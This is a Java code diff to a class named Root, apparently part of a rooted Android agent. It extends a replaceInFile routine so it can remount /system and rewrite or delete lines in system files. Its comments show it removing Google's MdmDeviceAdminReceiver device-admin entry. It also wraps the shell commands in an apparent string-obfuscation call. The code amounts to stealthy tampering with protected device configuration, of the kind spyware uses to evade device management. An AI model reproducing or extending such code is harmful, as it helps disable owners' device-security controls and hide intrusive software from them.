@@ -220,18 +220,19 @@ public class Root {
 		}
 	}
 
-	public static boolean replaceInFile(File fs, File tmpLocal,String matchString,String replace,Boolean isSystemWriting){
-		class LineMatchDetails{
-			public int lineOffset;
-			public String match;
-			public String replace;
-			public LineMatchDetails(int offset,String match,String replace){
-				this.match=match;
-				this.replace=replace;
-				this.lineOffset=offset;
-			}
-		}
-		ArrayList<LineMatchDetails> matchList = new ArrayList<LineMatchDetails>();
+	public static boolean replaceInFile(File fs, File tmpLocal,String matchRegExp,String replaceRegExp,String replace,Boolean isSystemWriting){
+		//examples:
+		// - to replace "com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver"
+		//   in "com.google.android.gms/com.google.android.gms.mdm.receivers.Fuck"
+		//   matchRegExp = ".*MdmDeviceAdminReceiver.*"
+		//   replaceRegExp = "MdmDeviceAdminReceiver"
+		//   replace = "Fuck"
+		// - to delete "com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver"
+		//   matchRegExp = ".*MdmDeviceAdminReceiver.*"
+		//   replaceRegExp = null
+		//   replace = null
+
+		Boolean matchFound=false;
 		Writer writer=null;
 		BufferedReader fileReader=null;
 		try {
@@ -239,23 +240,33 @@ public class Root {
 			if(tmpLocal.exists()){
 				tmpLocal.delete();
 			}
+			
 			writer = new BufferedWriter(new FileWriter(tmpLocal));
 			String lineContents ;
-
 			int offset=0;
-			Pattern pattern = Pattern.compile(".*"+matchString+".*");
+			Pattern pattern = Pattern.compile(matchRegExp);
 			while( (lineContents = fileReader.readLine()) != null)
 			{
-
 				Matcher matcher = pattern.matcher(lineContents);
 				String lineByLine = null;
 				if(matcher.matches())
 				{
-					System.out.printf("%s\n", "match:'"+lineContents+"' line offsets:"+offset);
-					lineByLine = lineContents.replaceAll(matchString,replace);
-					System.out.printf("%s\n", "replaced with:'"+ lineByLine+"'");
-					matchList.add(new LineMatchDetails(offset, lineContents, lineByLine));
-					writer.write(lineByLine+"\n");
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(replaceInFile): match'" + lineContents + "' line offsets:" + offset);
+					}
+					if(replace!=null){
+						lineByLine = lineContents.replaceAll((replaceRegExp!=null)?replaceRegExp:matchRegExp,replace);
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(replaceInFile): replaced with:'" + lineByLine + "'");
+						}
+						writer.write(lineByLine+"\n");
+					}else{
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(replaceInFile): deleted");
+						}
+					}
+					matchFound=true;
+
 				}else{
 					writer.write(lineContents+"\n");
 				}
@@ -263,10 +274,10 @@ public class Root {
 			}
 			fileReader.close();
 			writer.close();
-			if(!matchList.isEmpty()){
+			if(matchFound){
 				if(isSystemWriting) {
 					// Remount /system
-					Execute.execute(Configuration.shellFile + " " + "blw");
+					Execute.execute(Configuration.shellFile + " " + M.e("blw"));
 				}
 				try {
 					FileChannel source = null;
@@ -284,18 +295,18 @@ public class Root {
 						destination.close();
 						fdestination.close();
 					}
-
 				} catch (IOException e) {
-
-					System.out.printf("%s\n", " (openCopy trasferForm), error: " + e);
-
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (replaceInFile): trasferForm, error: " + e);
+					}
 					return false;
 				}
 				return true;
 			}
 		} catch (IOException e) {
-			System.out.printf("%s\n", " (openCopy), error: " + e);
-
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(replaceInFile):openCopy, error: " + e);
+			}
 		}finally{
 			if(writer!=null){
 				try {
@@ -303,17 +314,18 @@ public class Root {
 				} catch (IOException e) {
 				}
 			}
+
 			if(fileReader!=null){
 				try {
 					fileReader.close();
 				} catch (IOException e) {
 				}
 			}
+
 			if(isSystemWriting){
 				// Return /system to normal
-				Execute.execute(Configuration.shellFile + " " + "blr");
+				Execute.execute(Configuration.shellFile + " " + M.e("blr"));
 			}
-
 		}
 		return false;
 	}
@@ -321,7 +333,7 @@ public class Root {
 	static public boolean uninstallRoot() {
 		if (Status.haveRoot() == false) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (adjustOom): cannot uninstall this way without root privileges"); //$NON-NLS-1$
+				Check.log(TAG + " (uninstallRoot): cannot uninstall this way without root privileges"); //$NON-NLS-1$
 			}
 
 			return false;
